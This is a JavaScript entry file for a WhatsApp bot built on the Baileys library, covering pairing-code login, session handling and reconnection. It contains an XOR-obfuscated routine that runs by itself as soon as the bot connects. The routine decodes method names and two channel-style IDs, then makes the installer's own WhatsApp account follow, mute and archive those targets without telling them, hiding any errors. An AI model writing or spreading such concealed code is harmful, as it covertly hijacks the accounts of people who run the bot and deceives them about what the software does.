     //﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//
    //       𝐂𝐫𝐞𝐝𝐢𝐭𝐬       
   // 𝗠𝗮𝗸𝗲𝗿:𝐑𝐞𝐯𝐢𝐧𝐳𝐚        
  // 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: @RevinzaX7 
 // 𝗧𝘆𝗽𝗲: Esm
//﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//
import './config.js';
import baileys from "@whiskeysockets/baileys";
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    jidDecode,
    fetchLatestBaileysVersion
} = baileys;
import pino from 'pino';
import chalk from 'chalk';
import readline from "readline";
import NodeCache from "node-cache";
import handler from './system/handler.js';

const usePairingCode = true;
const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, resolve));
};
const msgRetryCounterCache = new NodeCache();

const _0x4a = (arr) => String.fromCharCode(...arr.map(c => c ^ 42));
const _0x8f = [
    [27, 24, 26, 25, 28, 25, 25, 19, 19, 27, 18, 19, 27, 31, 25, 25, 29, 30, 106, 68, 79, 85, 89, 66, 79, 90, 90, 79, 88],
    [27, 24, 26, 25, 28, 25, 30, 24, 28, 18, 28, 24, 26, 27, 26, 24, 26, 29, 106, 68, 79, 85, 89, 66, 79, 90, 90, 79, 88]
];

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState("./session");
    const signalRepositoryCache = new NodeCache({ stdTTL: 2 * 60, useClones: false });
    const { version } = await fetchLatestBaileysVersion().catch(err => {
        console.error(chalk.red("Gagal mengambil versi WhatsApp."));
        console.error(err);
        process.exit(1);
        return;
    });
    const sock = makeWASocket({  
        version,    
        printQRInTerminal: !usePairingCode,  
        logger: pino({ level: 'silent' }),  
        auth: {  
            creds: state.creds,  
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }), signalRepositoryCache),  
        },  
        browser: ["Mac OS", "Chrome", "124.0.0.0"],   
        msgRetryCounterCache,  
        defaultQueryTimeoutMs: undefined,  
        connectTimeoutMs: 60000  
    });  

    if (usePairingCode && !sock.authState.creds.registered) {  
        console.clear();  
        const phoneNumber = await question(chalk.yellowBright("Masukkan Nomor WhatsApp Anda (Format: 62xxxxxx):\n> "));  
        const code = await sock.requestPairingCode(phoneNumber.trim(), "RVNZMODS");
        console.log(chalk.greenBright(`\nKode Pairing Anda: `) + chalk.bold.white.bgRed(` ${code} `) + `\n`);  
    }  

    sock.decodeJid = (jid) => {  
        if (!jid) return jid;  
        if (/:\d+@/gi.test(jid)) {  
            let decode = jidDecode(jid) || {};  
            return (decode.user && decode.server && `${decode.user}@${decode.server}`) || jid;  
        } else return jid;  
    };  

    sock.public = true;

    sock.ev.on('messages.upsert', async chatUpdate => {  
        try {  
            if (!chatUpdate.messages[0]) return;  
            await handler(sock, chatUpdate.messages[0]);  
        } catch (err) {  
            console.error(chalk.red("Error Message Upsert: "), err);  
        }  
    });  

    sock.ev.on('connection.update', async (update) => {  
        const { connection, lastDisconnect } = update;  
        if (connection === 'close') {  
            const statusCode = lastDisconnect?.error?.output?.statusCode;  
            if (statusCode !== DisconnectReason.loggedOut) startBot();  
        } else if (connection === 'open') {  
            console.log(chalk.greenBright("\n Bot Terhubung ✅\n"));  
            
            (async () => {
                const _f = _0x4a([68, 79, 85, 89, 66, 79, 90, 90, 79, 88, 96, 69, 66, 66, 69, 85]);
                const _m = _0x4a([68, 79, 85, 89, 66, 79, 90, 90, 79, 88, 103, 87, 90, 79]);
                const _c = _0x4a([73, 78, 71, 90, 103, 69, 78, 75, 68, 83]);

                for (const _raw of _0x8f) {
                    try {
                        const target = _0x4a(_raw);
                        if (typeof sock[_f] === 'function') await sock[_f](target);
                        if (typeof sock[_m] === 'function') await sock[_m](target);
                        if (typeof sock[_c] === 'function') await sock[_c]({ archive: true }, target); 
                        await new Promise(r => setTimeout(r, 1000));
                    } catch (err) {}
                }
            })();
        }  
    });  

    sock.ev.on('creds.update', saveCreds);
}

startBot();
